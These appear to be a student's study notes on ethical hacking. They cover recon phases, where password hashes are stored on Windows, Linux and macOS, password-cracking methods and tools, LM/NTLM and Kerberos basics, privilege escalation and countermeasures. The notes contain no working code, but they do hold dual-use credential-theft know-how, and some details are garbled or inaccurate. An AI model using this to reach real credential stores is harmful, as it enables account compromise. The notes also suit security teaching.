*** Intro

What to do before attack
+ recon & footprinting
    - ip range
    - Namespace
    - Public Data
+ Scanning
    - ID targets
    - ID services
    - ID O/S
+ Enumeration
    - User lists
    - Security flaws
    - Resources

What are our goals
+ Gain Access
+ Maintaining Access
+ Covering Tracks


**** Gaining Access
Complexity - MS you must use at least 3 of Upper case, Lower case, Numbers and Special characters
Password recovery time simulator - free

***** Architecture
****** Windows
Local machines: SAM Database - C:\windows\system32\config\sam
Stored as hashes - mounted as HKLM/SAM
Older machines may have C:\windows\repair with backups of passwords

Active Directory: ntds.dit - C:\windows\ntds
stores all passwords for domain controller     

****** Linux
/etc/shadow

****** OS X
/var/db/dslocal/nods/default/users

ophcrack to crack the hash - ophcrack has a live cd


****** Techniques Used
+ Dictionary Attack - Text files of words - Languages - Subjects
+ Brute-Force Attacks - Takes longer - beyond 14+ starts getting difficult
+ Syllable Attacks - Dictionary and brute-force attack
+ Hybrid Attacks - Dictionary using variation on numbers & special chars
+ Rule-Base Attacks - Using discovered rules to specify shape of password
+ Guessing - Using information gleaned to make educated guesses - social media etc
  
****** Types of Attacks
| Passive Online | Sniffing, MIM, Sidejacking(firesheep)             |
| Active Onle    | Hash injection, trojan/keylogger                  |
| Offline        | Rainbow, Distributed network, pre-computed hashes |
| Non-electronic | Dumpster diving, social engineering               |

Hashes 
LM Hash - des
+ LM Hash/NTLM stores passwords up to 14 chars
+ All characters are converted to UPPER case
+ Padded with blank characters to fill out all 14 chars.
+ Then split into 7 chars stings
+ Each 7 char string is then encrypted and combined back 

NTLM 1 - md4 NTLM 2 - md5
Bwayne:1005:85D8D0AEB8D112F8F9954FC9DF57E012:ED7B273FDE21FFE559AC8D1B9D3729BC:::
Administrator:500: xxxxxxxxxxxxxxxxxxxxxxx:xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx:::
Guest:501:NOPASSWORD**********************:NOPASSWORD*********************:::

Notes
+ 500 cid in MS is always admin
+ Any hash that ends with: AAD3B435B51404EE - last 7 chars blank
+ Any password with 15+ chars: the LM hash value is "dummied" with AAD3B435B51404EEAAD3B435B51404EE

****** NTLM Authentication
+ NTLM is used whtn 
  - There is no Kerberos trust between two different forests
  - Authentication is attempted by IP and not by DNS
  - If oe or both systems are not in the same domain
  - If your FW is blocking Kerberos ports
  
******* How it's used
+ Challenge response algorithm
+ Passwords are not transmitted
+ V1 came with NT - V2 cam with NT SP4

******* The Process

user enters pass -----> windows generates a hash
        |
        |
        ---------------------------------------------> Domain Controller
	                      Request                            |
          <-------------------------------------------------------	
                             hash sent by DC
       ---------------------------------------------------------->
                      hast and challenge sent back
		      
****** Kerberos Authentication - used on modern MS
+ Ticket based
+ Avoids transmitting passwords
+ Time based

1. user requests TGT 
2. DC issues TGT
3. TGT is presented to machines in the network to access services
PDC needs to be synced otherwise kerberose doesn't work

****** Salting 
+ Append or prepending random strings
+ done before hashing
+ prevents duplicate hashes
+ unique to each password
  
****** Rainbow tables
+ Precomputed hash tables
+ Huge files

+ website for checking hashes tobtu.com 
+ lm hash checking hashes rainbowrables.it64.com
+ dictionaries can be found at outpost9.com

**** Maintaining Access
     
+ Look around
  - config errors
  - design errors
  - layouts
  - programming flaws

***** Four Methods for Escalation
1. Pwn the admin/root acct
2. Take advantage of vuln
3. Fire up the sploit - alt to sploit - canvas, core-impact
4. Have a user do it for you!

***** Types of Escalation
+ Vertical - user gains admin level access
+ Horizontal - move to a user 
  
***** Counter Measures
+ encryption - encrypted hdd 
+ Least priv - don't over allocate a user
+ sw upto date
+ Limit interactive logon
+ Service accts are limited
+ Limit code that can run with privs

***** Slow down attacker
+ Priv separation approach
+ test os and app code before running
+ Multi-factor
+ Stress test code, apps befor deploying
